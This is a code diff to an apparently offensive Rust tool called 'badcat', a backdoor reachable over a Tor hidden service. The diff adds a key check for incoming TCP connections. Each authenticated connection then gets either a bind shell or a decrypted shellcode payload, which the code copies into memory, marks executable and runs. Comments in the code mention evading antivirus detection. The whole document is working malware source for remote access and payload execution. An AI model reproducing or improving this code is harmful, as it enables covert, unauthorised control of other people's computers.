@@ -7,7 +7,8 @@ use std::fs::File;
 use std::net::{TcpListener, TcpStream};
 use std::path::PathBuf;
 use std::process::{Child, Command, Stdio};
-use std::{error, mem, ptr};
+use std::{error, mem, ptr, thread};
+use std::io::{Read, Write};
 
 use badcat_lib::io;
 use memmap::MmapMut;
@@ -96,30 +97,18 @@ fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Err
 
     for stream in listener.incoming() {
         match stream {
-            Ok(stream) => {
-                if setting.uses_payload {
-                    // decrypt payload. now the shellcode goes to memory
-                    // and may get detected by AV by now
-                    let payload = setting::get_payload(&setting)?;
-
-                    // tor hidden service will be our shellcode later,
-                    // so it need to be restarted
-                    tor_proc.kill()?;
-
-                    // set hidden service port as payload port
-                    unbundle_torrc(&torrc, payload.lport, &setting)?;
-
-                    // restart tor
-                    tor_proc = start_tor_binary(&torrc, &setting)?;
-
-                    execute_payload(payload.data)?;
-
-                    break;
-                } else {
-                    match bind_shell(stream) {
-                        Ok(()) => {}
-                        Err(error) => println!("connection error: {:?}", error),
-                    };
+            Ok(mut stream) => {
+                if let Ok(()) = authenticate(&mut stream, &setting) {
+                    if setting.uses_payload {
+                        if let Ok(payload) = setting::get_payload(&setting) {
+                            execute_payload(payload.data);
+                        }
+                    } else {
+                        match bind_shell(stream) {
+                            Ok(()) => {}
+                            Err(error) => println!("connection error: {:?}", error),
+                        };
+                    }
                 }
             }
             Err(error) => return Err(Box::new(error)),
@@ -129,6 +118,43 @@ fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Err
     tor_proc.kill()?;
 
     Ok(())
+}
+
+fn authenticate(stream: &mut TcpStream, setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
+    let mut buf = Vec::new();
+    
+    // allocate a buffer size of key length
+    for _ in 0..setting.key.len() {
+        buf.push(0);
+    }
+
+    if let Err(err) = stream.read_exact(&mut buf) {
+        return Err(err.into());
+    }
+
+    let untrusted_key = String::from_utf8_lossy(&buf);
+
+    let equals = untrusted_key.eq(&setting.key);
+
+    let reply = if equals {
+        &[1]
+    } else {
+        &[0]
+    };
+
+    if let Err(err) = stream.write(reply) {
+        return Err(err.into());
+    }
+
+    if let Err(err) = stream.flush() {
+        return Err(err.into());
+    }
+
+    if equals {
+        Ok(())
+    } else {
+        Err(String::from("not authenticated").into())
+    }
 }
 
 fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
@@ -167,20 +193,24 @@ fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
     Ok(())
 }
 
-fn execute_payload(payload: Vec<u8>) -> Result<(), Box<dyn error::Error>> {
+fn execute_payload(payload: Vec<u8>) -> ! {
+    // thread::spawn(move || {
     let len = payload.len();
 
     // writable memory
-    let mut w_map = MmapMut::map_anon(len)?;
+    let mut w_map = MmapMut::map_anon(len).unwrap();
 
     unsafe {
         // write shellcode
         ptr::copy(payload.as_ptr(), w_map.as_mut_ptr(), len);
 
         // transition to readable/executable memory
-        let x_map = w_map.make_exec()?;
+        let x_map = w_map.make_exec().unwrap();
 
         let code: extern "C" fn() -> ! = mem::transmute(x_map.as_ptr());
         code();
     };
+    // });
+
+    // Ok(())
 }
